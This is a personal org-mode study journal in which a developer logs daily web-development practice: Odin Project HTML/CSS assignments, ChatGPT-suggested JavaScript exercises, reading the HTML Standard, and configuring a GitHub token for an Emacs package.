  <meta charset="utf-8">
  <title>Worker example: One-core computation</title>
 </head>
 <body>
  <p>The highest prime number discovered so far is: <output id="result"></output></p>
  <script>
   var worker = new Worker('./worker.js');
   worker.onmessage = function (event) {
     console.log('hehe');
     document.getElementById('result').textContent = event.data;
   };
  </script>
 </body>
</html>
#+end_src

[[file:pages/worker.js][pages/worker.js]] ≡

#+begin_src js :tangle pages/worker.js
var n = 1;
search: while (true) {
  n += 1;
  for (var i = 2; i <= Math.sqrt(n); i += 1)
    if (n % i == 0)
     continue search;
  // found a prime!
  postMessage(n);
}
#+end_src

** Finished reading the HTML Standard (kind of)

Just finished reading the HTML Standard---skipping a lot of technical details.
Very interesting.
Funny to see the authors have a sense of humor :)

When I started reading, I wanted to

- Have a basic knowledge of all the elements
  - This was accomplished, as the Standard lists them all, with all the details.
- Learn how to do /responsive/ work with images
  - This was advanced, but I need to practice.
- Learn about Web Workers (and Worklets)
  - Idem.

** What now?

After reading the Standard, I still need to practice that knowledge.
I couldn't memorize each and every detail, so I need to apply to learn.
There are several good ways to learn, but I'll stick to Odin for now--- I'm invested.

** 1h of Coding

Wow!
Today another 1h of coding provided by our friend ChatGPT.
This time I had a harder time keeping up!
Couldn’t finish all the exercises in 1h.
But learned a lot!

[[file:pages/2025-10-05_1h.html][pages/2025-10-05_1h.html]] ≡

#+begin_src html :tangle pages/2025-10-05_1h.html
<!DOCTYPE html>

<html lang="en">

  <head>
    <meta charset="UTF-8">
    <title>JS with ChatGPT</title>
    <style>
    .dark {
      background-color: black;
      color: white;
    }
    </style>
  </head>

  <body id="body">
    <ul>
      <li><button id="start">Start Timer</button></li>
      <li><button id="stop">Stop Timer</button></li>
      <li><p id="display">0</p></li>
      <li><button id="buttonDarkMode">Toggle Dark Mode</button></li>
      <li><button id="buttonRandomFruit">Random Fruit</button></li>
      <li><p id="pRandomFruit"></p></li>
    </ul>
    <hr>
    <ul id="tasksUl"></ul>
    <script>
    /* Minute 0–10: Timers
     ,* 12. Add a button “Start Timer” and a <p> that starts counting up seconds when clicked.
     ,* Bonus: add a “Stop Timer” button.
     ,* Learn: setInterval, clearInterval. */
    const display = document.getElementById("display");
    function updateDisplay() {
      display.textContent = Number(display.textContent) + 1;
    }
    const start = document.getElementById("start");
    const stop = document.getElementById("stop");
    let intervalID = 0;
    start.addEventListener("click", () => {
      if (!intervalID) {
        intervalID = setInterval(updateDisplay, 1000);
      }
    });
    stop.addEventListener("click", () => {
      clearInterval(intervalID);
      intervalID = 0;
    });

    /* Minute 10–20: Toggle behavior
     ,* 13. Add a button “Toggle Dark Mode.”
     ,* Clicking it should switch the page background to black and text to white, and back again.
     ,* Learn: class toggling (element.classList.toggle). */
    const body = document.getElementById("body");
    document.getElementById("buttonDarkMode")
            .addEventListener("click", () => {
              body.classList.toggle("dark");
            });

    /* Minute 20–30: Random fun
     ,* 14. Add a button “Random Fruit.”
     ,* Reuse your fruits array. Each click should display one random fruit in a <p>.
     ,* Learn: Math.floor(Math.random() * arr.length). */
    function getRandomItem(arr) {
      const i = Math.floor(Math.random() * arr.length);
      return arr[i];
    }
    const fruits = ['apple', 'banana', 'pineapple', 'grapefruit', 'orange'];
    document.getElementById("buttonRandomFruit")
            .addEventListener("click", () => {
              document.getElementById("pRandomFruit").textContent =
                getRandomItem(fruits);
            });

    /* Minute 30–40: Arrays of objects
     ,* 15. Create an array of “tasks,” each object with {text: "Do homework", done: false}.
     ,* Write a function to print them all into a <ul>.
     ,* Bonus: strike-through text if done is true.
     ,* Learn: DOM lists, iterating objects. */
    const tasks = [
      {text: "Do homework", done: false,},
      {text: "Do laundry", done: false,},
      {text: "Walk the dogs", done: false,},
      {text: "Fix spaceship", done: false,},
      {text: "Adopt a giraffe", done: true,},
    ];

    for (const task of tasks) {
      let taskLi = document.createElement('li');
      let taskText = document.createTextNode(task.text);
      if (task.done) {
        let sElement = document.createElement("s");
        sElement.appendChild(taskText);
        taskLi.appendChild(sElement);
      } else {
        taskLi.appendChild(taskText);
      }
      document.getElementById("tasksUl").appendChild(taskLi);
    }
    </script>
  </body>
</html>
#+end_src

** Seinfeld Checkmark

[[file:images/2025-10-05_seinfeld.jpeg]]

* [2025-10-04 Sat]

** Google's course

Today I wanna do something "risky": peak at [[https://web.dev/][Google's webdev course]].
I’m feeling curious about a lot of technical nuances and details, and kinda looking for some course that is a middle ground between /hands-on/-focused and /technical-standards/-focused.
The idea is to go over the curriculum, and then reflect.
When I was reading the HTML tech specs, I saw a lot of things that weren't covered on the tutorials; /cool/ things!
I don't know if I should focus on those specs first, or courses, or books.
But I believe a quick look at the curriculum can't hurt.
Let's do it!

The HTML Course is heavily based on the official HTML Standard, but, still, very /fragmented/, and sometimes /vague/.

** HTML Standard

I'm feeling /adventurous/.
Gonna give a peek at the Standard this weekend.

Just read the first 3 chapters; very /technical/---skipped a lot of details.
But the advantage I see is: /not/ consuming a piece of information is /voluntary/, as opposed to consuming third-party tutorials and courses, where they /decide/ which information to ommit.
The problem is: there are no /exercises/; I'll have to deal with that deficiency somehow; probably with tutorials and courses, but /after/ having a general idea of the whole shabang.

** Coding hour

I was half-intending to consider reading the HTML Standard as /valid coding/ for the 1h/day streak.
But... nah.
Then I tried to find something to code.
I want either Elisp or JavaScript.
JavaScript, for focus on current major learning goals.
Exercism, HackerRank, LeetCode, all very advanced problems.
Then asked ChatGPT for some, and this is what I got:

#+begin_src html
<!DOCTYPE html>

<html lang="en">

  <head>
    <meta charset="UTF-8">
    <title>JS with ChatGPT</title>
  </head>
  <body>
    <section>
      <button id="leButton">Je suis leButton</button>
      <p id="leP">Je suis leP.</p>
    </section>
    <section>
      <button id="buttonColorize">Colorize!</button>
    </section>
    <section>
      <input id="leInput" type="Text">
      <button id="leInputButton">Je suis leInputButton</button>
      <p id="leInputP">Je suis leInputP.</p>
    </section>
    <section>
      <p id="leCounterP">0</p>
      <button id="leCounterButtonPlus">+</button>
      <button id="leCounterButtonMinus">-</button>
    </section>

    <script>
     /* 1. Print “Hello, world!” in the console. */
     console.log('Hello, World!');

     /* 2. Store your name in a variable and log Hello, <name>!. */
     const name="Rafael";
     console.log(`Hello, ${name}!`);

     /* 3. Write a function double(n) that returns n * 2.
        Test it with
        console.log(double(5)). */
     function double(n) {
       return n * 2;
     }
     console.log(double(5));

     /* 4. Ask the user for a number (prompt). If it’s even, log “even”; else “odd”. */
     /* const number = Number(prompt('Give me a number, please.'));
      * if (number % 2 === 0) {
      *   console.log('even');
      * } else {
      *   console.log('odd');
      * } */

     /* 5. Create a function max(a, b) that returns the bigger number. */
     function max(a, b) {
       if (a > b) {
         return a;
       } else {
         return b;
       }
     }

     /* 6. Make an array of 5 fruits. Loop through it and log each fruit. */
     const fruits = ['apple', 'banana', 'pineapple', 'grapefruit', 'orange'];
     for (let i = 0; i < fruits.length; i++) {
       console.log(fruits[i]);
     }

     for (const fruit of fruits) {
       console.log(fruit.toUpperCase());
     }

     /* 7. Write a function that takes an array of numbers and returns their sum. */
     const numbers = [1, 2, 3];
     const sum = numbers.reduce((sum, number) => sum + number);
     console.log(sum);

     /* 8. In HTML, add a <button> and a <p>.
        In JS, when you click the button, change the <p> text to “Button clicked!”. */
     const leButton = document.getElementById("leButton");
     const leP = document.getElementById("leP");
     leButton.addEventListener("click", function () {
       leP.textContent = "Button clicked!";
     });

     /* 9. Add another button that, when clicked, changes the page background color randomly. */
     function randomColor() {
       const randomColor = Math.floor(Math.random() * 16777215).toString(16);
       // Pad with leading zeros if the hex string is shorter than 6 characters
       return `#${randomColor.padStart(6, '0')}`;
     }

     const buttonColorize = document.getElementById("buttonColorize");
     buttonColorize.addEventListener("click", function () {
       color = randomColor();
       console.log(color);
       document.body.style.backgroundColor = color;
     });

     /* 10. Add an <input> and a button.
        When you click the button, display “Hello, <input value>!” in a <p>. */
     const leInput = document.getElementById("leInput");
     const leInputButton = document.getElementById("leInputButton");
     const leInputP = document.getElementById("leInputP");
     leInputButton.addEventListener("click", function () {
       leInputP.textContent = `Hello, ${leInput.value}!`;
     });

     /* Minute 50–60: Mini-project
      * 11. Build a tiny “counter”:
      *     - Add a <p> that shows 0.
      *     - Add “+” and “–” buttons.
      *       - Clicking “+” increases the number, “–” decreases it. */
     const leCounterP = document.getElementById("leCounterP");
     const leCounterButtonPlus = document.getElementById("leCounterButtonPlus");
     const leCounterButtonMinus = document.getElementById("leCounterButtonMinus");
     leCounterButtonPlus.addEventListener("click", function () {
       leCounterP.textContent = `${Number(leCounterP.textContent) + 1}`;
     });
     leCounterButtonMinus.addEventListener("click", function () {
       leCounterP.textContent = `${Number(leCounterP.textContent) - 1}`;
     });
    </script>
  </body>
</html>
#+end_src

After I submitted my solutions, ChatGPT
- complimented the random color generator (Google's LOL)

  #+begin_quote
  Stylistic note
  Your random color generator is neat — padding the hex code was a smart touch! That’s something even many beginners forget.
  #+end_quote
- gave some stylistic and best practices that I didn't agree at first

  #+begin_quote
  Counter readability
  Instead of converting textContent back and forth each click, you could keep a separate variable:
  #+end_quote

  #+begin_src js
  let counter = 0;
  function updateCounter() {
    leCounterP.textContent = counter;
  }
  leCounterButtonPlus.addEventListener("click", () => {
    counter++;
    updateCounter();
  });
  leCounterButtonMinus.addEventListener("click", () => {
    counter--;
    updateCounter();
  });
  updateCounter();
  #+end_src

  My version is more compact, but looks clumsier.
  I could have also done away with the ~`...`~, as it accepts numbers.

  #+begin_src js
  leCounterButtonPlus.addEventListener("click", function () {
      leCounterP.textContent = `${Number(leCounterP.textContent) + 1}`;
  });
  leCounterButtonMinus.addEventListener("click", function () {
      leCounterP.textContent = `${Number(leCounterP.textContent) - 1}`;
  });
  #+end_src



Learned another one!

Surprisingly, it took me just about one hour to do those!
Good on you, ChatGPT!

** Seinfeld Checkmark

[[file:images/2025-10-04_seinfeld.jpeg]]

* [2025-10-03 Fri]
Today I start a new lesson, and a new branch on the assignment tree: /Cascade/, the *C* from CSS.
Just read the lesson text, and now am complementing with the Wikipedia article.
I realized that the more formal texts (like standards) work better for me.
Maybe it's because I like the /raw/ info/rules, and then make my own analogies.

Doing some clean-up on the 02-... assignment.
Also did some cleanup for the other assignments (portfolios should be good looking!)

** 01-cascade-fix
Finished this one today.
It was about that apparently bothers devs a lot: find out the culprit for unexpected styling behavior.
I like that type of mental game!

** Seinfeld Checkmark

[[file:images/2025-10-03_seinfeld.jpeg]]

* [2025-10-02 Thu]

Check out the links for each exercise, with all the action [[https://github.com/rafaelbeirigo/odin-css-exercises][here]].

** 02-class-id-selectors
Just finished second CSS Assignment, and added a checkmark to the [[https://github.com/rafaelbeirigo/odin-css-exercises/tree/main][main README of the tasks]].
This one I had to fix a minor detail after finishing it, and then looking at the recommended solution.
I didn't catch one shared property among elements, which could make code legibility and maintenance much easier.
Learned another one!

Now, out to busking, and later some more!

** 03-grouping-selectors
Back from busking, very tired.
But ready to code!

Used my free time to read ahead the [[https://github.com/rafaelbeirigo/odin-css-exercises/tree/main/foundations/intro-to-css/03-grouping-selectors][next assignment]].
Let's get to it.
Done!
After 48 minutes.

For this exercise, I just went full LP, finished the assignment, and /only then/ commited the chunks.
It was much easier to get things flowing, but a little bit messier when dealing with text edits.
But I believe this is a nice approach.

** 04-chaining-selectors
This one was the quickest so far!
Again, LP, and then commit helped.

** 05-descendant-combinator
This was even quicker: 8 minutes!

And with it, I finished the first branch, =intro-to-css=!

** Seinfeld Checkmark
[[file:images/2025-10-02_seinfeld.jpeg]]

* [2025-10-01 Wed]
Today started with some final polishing on the [[https://github.com/rafaelbeirigo/odin-recipes][Recipes Project]].

Writing the commits before coding was a success.
Very comforting to code when you know there's a light at the end of the tunnel, and no rework will be necessary (well, maybe /less/ work...)

Just found out that the [[https://html.spec.whatwg.org/dev][HTML Specification has a version for developers]].
Did some reading, nice stuff.
But potentially a rabbit hole.
Will focus on [[https://www.theodinproject.com/][Odin]].

Now, I start learning CSS!

The action is happening in my [[https://github.com/rafaelbeirigo/odin-css-exercises/blob/main/foundations/intro-to-css/01-css-methods/README.org][forked repo of the CSS Exercises]].

** Notes from today
- I'm clocking my work, and this is helping to keep me grounded, and also learn realistic timetable expectations;
- CSS is fun
- Literate Programming is really helpful to organize the work, especially so when I must leave the work half-finished, and come back later: it's faster to hit the ground running with LP

** Seinfeld Checkmark

[[file:images/2025-10-01_seinfeld.jpeg]]

* [2025-09-30 Tue]
Back at it!

This new project felt too simple.
I kinda underestimated it and couldn't do something I wanted: a clean commit history from the beginning.
I'll try another approach today: write the commit messages /before/ coding.
Let's see how that goes.
(Still working on the [[https://github.com/rafaelbeirigo/odin-recipes][project Recipes from Odin]]).

Edit: You can see the final version of the page [[https://rafaelbeirigo.github.io/odin-recipes/][here]] (three recipes inspired on Harry Potter's books).

** Systems Thinking
Just heard about it this week.
I believe I applied it today.
I love it!

** Results: Writing the commits before coding
/Very/ helpful, much better!
Knowing that each task had a purpose, and that we would get to the final product was very empowering and calming.
I'd call it a success!

** Seinfeld Checkmark

[[file:images/2025-09-30_seinfeld.jpeg]]

* [2025-09-29 Mon]
Back to HTML!

We're approaching a project on Odin!

Starting with Git.

Just learned about Commit Messages.

Next is a project, and then we start CSS.

** Digression on Git

I have been thinking about yesterday's work, with lots of refactoring, while porting to LP.
It was difficult to keep a clean commit history.

I believe the best way to accomplish it is by planning beforehand.
I have some ideas, that I will experiment with in this next project.

** Project: Recipes

Check it out [[https://github.com/rafaelbeirigo/odin-recipes][here]].

** Seinfeld Checkmark

Hoje foi um dia difícil, mas consegui o X!

[[file:images/2025-09-29_seinfeld.jpeg]]

* [2025-09-28 Sun]
Thought of doing some elisp coding this sunday.
I have this [[https://github.com/rafaelbeirigo/ma-github][project that creates Github repositories directly from inside Emacs]].
As they say: "Life is better when you don't have to leave your editor".

Last time I touched it was 3 years ago.

Today I thought of checking it out, seeing how it stands, and maybe hacking it a bit.
So, for this coding, all the action will happen  [[https://github.com/rafaelbeirigo/ma-github/commits/dev/][commit history for the dev branch of the repository of that project]].

This is how it went.

** Create a Github token
*** First try: Generate a classic token with all the powers
**** Generate
I just checked out if I had the repo in my machine, and it was there.

Then I followed the repo's instructions to run it.
You need an *access token*, and I had to create one.
The proccess was cryptic:
- You have to choose the powers of your token;
- I wanted the power to *create a repository*;
- I couldn't find that option there.


After getting scared by the implications of them insisting on an /expiration date/ for the token, I wanted to create the least powerful, but still useful token.
Invested a dozen minutes trying to read throught the docs, and then realized *I was going down a rabbit hole*.

Decided on just creating the most powerful token possible, with a very short expiration date---seven days (/The Ring/, anyone?).
The steps were:

1. Open the [[https://github.com/settings/tokens/new][page to generate a /Classic/ token]]
2. Put on *Note*: ma-github
3. On *Expiration*: 7 days
4. On *Select scopes*: select everything
5. Click *Generate token*
6. Copy the generated token and paste it on a safe place

**** Access from inside Emacs
Here I Needed some help from ChatGPT:

#+begin_quote
i want to have my Github token accessed by Emacs
How should I do it?
#+end_quote

Then ChatGPT inspired me to change gears.

*** Second try (ChatGPT): Generate a fine-grained token with minimal powers
**** Generate
1. Go to the [[https://github.com/settings/personal-access-tokens][Github page to generate a fine-grained token]]
2. Click *Generate new token*
3. *Token name*: ma-github
4. *Resource owner*: the Github account where the repositories will be created
5. *Expiration*: 30 days
6. *Repository access*: All repositories
7. *Permissions*
   1. Click the *+* button on the upper-right corner
   2. Select *Administration*
   3. Click outside of the selection thingy to make it disappear
   4. On the new item *Administration*, change from *Read-only* to *Read and write*
8. Click *Generate token*
9. Click *Generate token* again, on the pop-up window
10. Copy the token
11. Paste it somewhere safe

**** Access from inside Emacs

***** Set up *authinfo*

1. Follow this [[https://www.masteringemacs.org/article/keeping-secrets-in-emacs-gnupg-auth-sources][instructions to create =~/.authinfo.gpg~]]

   1. Create a key

      1. Open a terminal and run the command

         #+begin_src shell
         gpg --gen-key
         #+end_src

      2. Inform your real name and then your email

      3. It will generate a key in =~/.gnupg=

2. Create (or edit) the file =~/.authinfo.gpg= in Emacs. Use this format (one line per entry):

   #+begin_example
   machine api.github.com login YOUR_GITHUB_USERNAME password <YOUR_TOKEN>
   #+end_example

3. Change the permissions of the file to make it more secure

   #+begin_src shell
   chmod 600 ~/.authinfo.gpg
   #+end_src

***** Fetch the token using *authinfo*

This code snippet uses the token created before to give =ma-github= access to Github.
It

1. Asks for a Github username, and then

2. Sets the environment variables needed by =ma-github=.

#+begin_src elisp
;; ensure auth-source uses the default backends (it does by default)
;; Here is a tiny helper that reads the token and (optionally) sets env var:

(require 'auth-source)

(defun ma-github-token-from-authinfo (&optional username)
  "Find a GitHub token from auth-source for api.github.com and return the secret string."
  (let* ((host "api.github.com")
         (user (or username user-login-name))
         (entry (car (auth-source-search :host host :user user :max 1))))
    (when entry
      (let ((secret (plist-get entry :secret)))
        (if (functionp secret) (funcall secret) secret)))))

;; optional: make token available to Emacs subprocesses (e.g. `curl` from Emacs)
(let* ((user (read-string "Github username: "))
       (tok (my/github-token-from-authinfo user)))
  (when user
    (setenv "MA_GITHUB_USER" tok))
  (when tok
    (setenv "MA_GITHUB_TOKEN" tok)))
#+end_src

Now let's try and create a repo with ma-github.

#+begin_quote
M-x ma-github-create
#+end_quote

And here is the [[https://github.com/rafaelbeirigo/hello-ma-github][Github repository created using ma-github]]!

Now let's integrate the *auth-source* functionality.

Timeline (I tried, but too distracting!):

1. [2025-09-28 Sun 13:13] Breaking the code down in LP blocks.

2. [2025-09-28 Sun 13:13] info on defun optional arguments

3. [...] All the action is on the [[https://github.com/rafaelbeirigo/ma-github/commits/dev/][commit history for the dev branch]].

4. [2025-09-28 Sun 21:02] Ported to LP and tested: (ma-github-create NAME)

I tried my best to be organized, but it's messy.
Next step is to reorganize the commits.
Not for /functionality/, but /learning/.

** Seinfeld Checkmark

[[file:images/2025-09-28_seinfeld.jpeg]]

* [2025-09-27 Sat]
Starting later today.
Overslept.

Let's do this!

** Lists
#+begin_quote
To get some practice using lists, create a new HTML document and create the following lists:
1. An unordered shopping list of your favorite foods
2. An ordered list of todo’s you need to get done today
3. An unordered list of places you’d like to visit someday
4. An ordered list of your all time top 5 favorite video games or movies
#+end_quote

Create the structure for main HTML doc:

[[file:odin/assignments/foundations/lists/index.html][odin/assignments/foundations/lists/index.html]] ≡

#+begin_src html :tangle ~/dev/webdev-study/odin/assignments/foundations/lists/index.html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>My first page from Odin</title>
  </head>

  <body>
    <<food>>
    <<todos>>
    <<places>>
    <<games>>
  </body>
</html>
#+end_src

#+begin_quote
1. An unordered shopping list of your favorite foods
#+end_quote

~<<food>> +≡~

#+begin_src html :noweb-ref food
<h1>My favorite foods</h1>
<ul>
  <li>Lasagna</li>
  <li>Pork ribs</li>
  <li>Avocado with lemon</li>
  <li>Oatmeal</li>
  <li>Warm bread with (real) butter</li>
</ul>
#+end_src

#+begin_quote
2. An ordered list of todo’s you need to get done today
#+end_quote

~<<todos>> +≡~

#+begin_src html :noweb-ref todos
<h1>Todos for Todays</h1>
<ol>
  <li>Code a minimum of 1h</li>
  <li>Exercise and stretch</li>
  <li>Busking</li>
  <li>Play with dogs</li>
  <li>RPG with ChatGPT</li>
</ol>
#+end_src

#+begin_quote
3. An unordered list of places you’d like to visit someday
#+end_quote

~<<places>> +≡~

#+begin_src html :noweb-ref places
<h1>Places I want to visit</h1>
<ul>
  <li>Paris</li>
  <li>Japan</li>
  <li>Portugal</li>
  <li>Germany</li>
  <li>Canada</li>
</ul>
#+end_src

#+begin_quote
4. An ordered list of your all time top 5 favorite video games or movies
#+end_quote

~<<games>> +≡~

#+begin_src html :noweb-ref games
<h1>My favorite games of all time</h1>
<ol>
  <li>Zelda (Ocarina)</li>
  <li>Pokémon Blue/R./Y.</li>
  <li>Metal Slug</li>
  <li>Super Mario World</li>
  <li>Harvest Moon (NES)</li>
</ol>
#+end_src

** [2025-09-27 Sat 11:40] Links and Images
*** Links
:PROPERTIES:
:header-args:html: :session *links-and-images*
:END:
#+begin_quote
1. Create a new directory named odin-links-and-images.
#+end_quote

#+begin_src bash
mkdir ./odin/assignments/foundations/odin-links-and-images
#+end_src

#+RESULTS:

#+begin_quote
2. Within that directory, create a new file named index.html.
3. Open the file in VS Code and fill in the usual HTML boilerplate.
#+end_quote

[[file:odin/assignments/foundations/odin-links-and-images/index.html][odin/assignments/foundations/odin-links-and-images/index.html]] ≡

#+begin_src html :tangle odin/assignments/foundations/odin-links-and-images/index.html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>My first page from Odin</title>
  </head>

  <body>
    <<body Content odin-links-and-images>>
  </body>
</html>
#+end_src

#+begin_quote
4. Finally, add the following h1 to the body:

<h1>Homepage</h1>
#+end_quote

~<<body Content odin-links-and-images>> +≡~

#+begin_src html :noweb-ref body Content odin-links-and-images
<h1>Homepage</h1>
#+end_src

[2025-09-27 Sat 11:57] Pausing for lunch.

[2025-09-27 Sat 17:57] Coming back, after busking.

The Web is made out of links.
Let's add our first one.
We need to add an *anchor* element, and give it some attributes.
We'll leave a placeholder for the attributes.

~<<body Content odin-links-and-images>> +≡~

#+begin_src html :noweb-ref body Content odin-links-and-images :noweb-seb nil
<a
  <<attributes for Odin about page href>>
  >About the Odin Project.</a>
#+end_src

The first attribute contains the /link/ itself, and is called *href*.

~<<attributes for Odin about page href>> +≡~

#+begin_src html :noweb-ref attributes for Odin about page href
href="https://www.theodinproject.com/about"
#+end_src

The link now would open on the same tab.
Let's open in a new one, using the attribute *target*.

~<<attributes for Odin about page href>> +≡~

#+begin_src html :noweb-ref attributes for Odin about page href
target="_blank"
#+end_src

Now we add some security measures.
This new attribute and value prevents some dangers when linking to another page.
Possible attacks include phishing and tabnabbing.

~<<attributes for Odin about page href>> +≡~

#+begin_src html :noweb-ref attributes for Odin about page href
rel="noopener noreferrer"
#+end_src

**** Relative links

Create a page on our own server.

*NOTE:* the =pages/= was added later in this assignment.

[[file:odin/assignments/foundations/odin-links-and-images/about.html][odin/assignments/foundations/odin-links-and-images/pages/about.html]] ≡

#+begin_src html :tangle odin/assignments/foundations/odin-links-and-images/pages/about.html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>Odin Links and Images</title>
  </head>

  <body>
    <h1>About Page</h1>
    <<le Charles>>
  </body>
</html>
#+end_src

Add a /relative/ link to it on the main page.

~<<body Content odin-links-and-images>> +≡~

#+begin_src html :noweb-ref body Content odin-links-and-images
<a href="pages/about.html">About</a>
#+end_src

Let's organize it: add a folder for all the other pages besides =index.html=.

#+begin_src shell :dir ~/dev/webdev-study/odin/assignments/foundations/odin-links-and-images/
mkdir pages
#+end_src

#+RESULTS:

And move =about.html= there.

#+begin_src shell :dir ~/dev/webdev-study/odin/assignments/foundations/odin-links-and-images/
mv about.html pages
#+end_src

#+RESULTS:

*** Images
:PROPERTIES:
:header-args: :dir ~/dev/webdev-study/odin/assignments/foundations/odin-links-and-images/
:END:

Assignment.

#+begin_quote
1. Create a new directory named images within the odin-links-and-images project.
#+end_quote

#+begin_src shell
mkdir images
#+end_src

#+RESULTS:

#+begin_quote
2. Next, download our practice image and move it into the images directory we just created.
3. Rename the image to dog.jpg.
#+end_quote

#+begin_src shell
wget --output-document=images/dog.jpg https://unsplash.com/photos/Mv9hjnEUHR4/download?force=true&w=640
#+end_src

#+RESULTS:

Add the image to the home page, and the About one (using relative path).
Both will have some attributes that are the same.
Let's give them a placeholder.

~<<body Content odin-links-and-images>> +≡~

#+begin_src html :noweb-ref body Content odin-links-and-images
<img src="./images/dog.jpg"
<<dog pic attributes>>
  >
#+end_src

Now add the pic to the About page, using a relative path to the parent folder.

~<<le Charles>> +≡~

#+begin_src html :noweb-ref le Charles
<img src="../images/dog.jpg"
<<dog pic attributes>>
  >
#+end_src

Add the alternative text.

~<<dog pic attributes>> +≡~

#+begin_src html :noweb-ref dog pic attributes
alt="A black dog (pug) with a gray wool blanket."
#+end_src

**** Image size attributes
Now the size attributes.

~<<dog pic attributes>> +≡~

#+begin_src html :noweb-ref dog pic attributes
width="604" height="806"
#+end_src

*** [2025-09-27 Sat 19:37] Assignment on [[https://internetingishard.netlify.app/html-and-css/links-and-images/][Interneting]]
:PROPERTIES:
:header-args:
:END:

[[file:odin/assignments/foundations/interneting-links-and-images/links.html][odin/assignments/foundations/interneting-links-and-images/links.html]] ≡

#+begin_src html :tangle odin/assignments/foundations/interneting-links-and-images/links.html
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Links</title>
    <meta charset="UTF-8">
  </head>
  <body>
    <h1>Links</h1>
    <p>This particular page is about links! There are three kinds of links:</p>

    <ul>
      <<links>>
    </ul>
  </body>
</html>
#+end_src

[[file:odin/assignments/foundations/interneting-links-and-images/images.html][odin/assignments/foundations/interneting-links-and-images/images.html]] ≡

#+begin_src html :tangle odin/assignments/foundations/interneting-links-and-images/images.html
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Images</title>
    <meta charset="UTF-8">
  </head>
  <body>
    <h1>Images</h1>
    <p>This page covers common image formats, but you may also be looking for
      <a href='links.html'>links</a> and
      <a href='misc/extras.html'>useful extras</a>.
    </p>
    <<images>>
  </body>
</html>
#+end_src

[[file:odin/assignments/foundations/interneting-links-and-images/misc/extras.html][odin/assignments/foundations/interneting-links-and-images/misc/extras.html]] ≡

#+begin_src html :tangle odin/assignments/foundations/interneting-links-and-images/misc/extras.html :mkdirp yes
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Extras</title>
    <meta charset="UTF-8">
  </head>
  <body>
    <h1>Extras</h1>
    <p>This page is about miscellaneous HTML things,
      but you may also be interested in
      <a href='../links.html'>links</a> or
      <a href='../images.html'>images</a>.
    </p>
    <h2>Character Sets</h2>
    <p>You can use UTF-8 to count in Turkish:</p>
    <ol>
      <li>bir</li>
      <li>iki</li>
      <li>üç</li>
      <li>dört</li>
      <li>beş</li>
    </ol>
    <<Reserved Characters>>
    <<Curly Quotes>>
  </body>
</html>
#+end_src

Unzip images.

#+begin_src shell :dir odin/assignments/foundations/interneting-links-and-images/
unzip images-4149f7.zip
rm images-4149f7.zip
#+end_src

#+RESULTS:
| Archive:   | images-4149f7.zip |
| inflating: | -4149f7.zip       |

Absolute links.

~<<links>> +≡~

#+begin_src html :noweb-ref links
<li>Absolute links, like to
  <a href='https://developer.mozilla.org/en-US/docs/Web/HTML'
    target='_blank'>Mozilla
    Developer Network</a>,
  which is a very good resource for web developers.
</li>
#+end_src

Relative Links.

~<<links>> +≡~

#+begin_src html :noweb-ref links
<li>Relative links, like to our <a href='misc/extras.html'>extras page</a>.
</li>
#+end_src

~<<links>> +≡~

#+begin_src html :noweb-ref links
<!-- This won't work for our local HTML files -->
<li>Root-relative links, like to the
  <a href='/'>home page</a>
  of our website, but those aren't useful to us right now.
</li>
#+end_src

Add the images.
First a JPG, good for *pictures* (large color palettes).

~<<images>> +≡~

#+begin_src html :noweb-ref images
<h2>JPGs</h2>
<p>JPG images are good for photos.</p>
<img src='images/mochi.jpg' width='75'
<<alt jpg>>
  >
#+end_src

Then a GIF, for *animations*, (short color palettes, crude transparency).

~<<images>> +≡~

#+begin_src html :noweb-ref images
<h2>GIFs</h2>
<p>GIFs are good for animations.</p>
<img src='images/mochi.gif' width='75'
<<alt gif>>
  >
#+end_src

Now a PNG, good transparency, large color palletes, but bigger than JPG.
Useful for small images that need good transparency, like icons and logos.

~<<images>> +≡~

#+begin_src html :noweb-ref images
<h2>PNGs</h2>
<p>PNGs are good for icons and logos.</p>
<img src='images/mochi.png' width='75'
<<alt png>>
  >
#+end_src

Finally the SVG, /vector/ based (as opposed to /pixel/-): scales without loss of quality.
Use them instead of PNGs whenever possible.

~<<images>> +≡~

#+begin_src html :noweb-ref images
<h2>SVGs</h2>
<p>SVGs are <em>amazing</em>. Use them wherever you can.</p>
<img src='images/mochi.svg' width='75'
<<alt svg>>
  >
#+end_src

~<<alt jpg>> +≡~

#+begin_src html :noweb-ref alt jpg
alt='A mochi ball in a bubble'
#+end_src

~<<alt gif>> +≡~

#+begin_src html :noweb-ref alt gif
alt='A dancing mochi ball'
#+end_src

~<<alt png>> +≡~

#+begin_src html :noweb-ref alt png
alt='A mochi ball'
#+end_src

~<<alt svg>> +≡~

#+begin_src html :noweb-ref alt svg
alt='A mochi ball with Bézier handles'
#+end_src

~<<Curly Quotes>> +≡~

#+begin_src html :noweb-ref Curly Quotes
<p>If you&rsquo;re into &ldquo;web typography,&rdquo; you&rsquo;ll also find
   yourself using curly quotes quite a bit.
</p>
#+end_src

**** Reserved Characters
~<<Reserved Characters>> +≡~

#+begin_src html :noweb-ref Reserved Characters
<h2>HTML Entities</h2>
<p> There are three reserved characters in HTML:
  <strong>&lt;</strong> <strong>&gt;</strong> and <strong>&amp;</strong>.
  You should always use HTML entities for these three characters.
</p>
#+end_src

** Seinfeld Checkmark
[[file:images/2025-09-27_seinfeld.jpeg]]

* [2025-09-26 Fri]
** Feel like snowballing.
Was drifting and rabbit-holling, as per usual
Checking out the [[https://www.theodinproject.com/dashboard][Odin Project]], thought it was cool they also develop /character/.
Grit, resilience, and the rollercoaster to mastery were eye-openers to me.

Asked ChatGPT for help there.
Got realistic market analysis, criticism about main goal, specific roadmap with projects, and milestones.

Started applying the Seinfeld checkmarks.
I want to code a minimum of 1 hour every day.
Almost procrastinated until I bought a cool sheet with the squares, but ended up doing it by hand.

[[file:images/2025-09-26_seinfeld.jpeg]]

I really like those sites that allow you to code online.
Did 3 min of Exercism, elisp.
But then felt guilty, because I was derailing from the reading materials from Odin.
I want to code in other languages, besides JS.
I'll make sure to include them.
I want it to be also fun and enjoyable :)

Decided to turn this into a journal for accountability.
A bit of afraid this will derail me (happened in the past), but more confident on my resilience and emotional regulation skills this time.
Let's see.

Reading a lot of the initial material from Odin.
Decided on the Foundations.
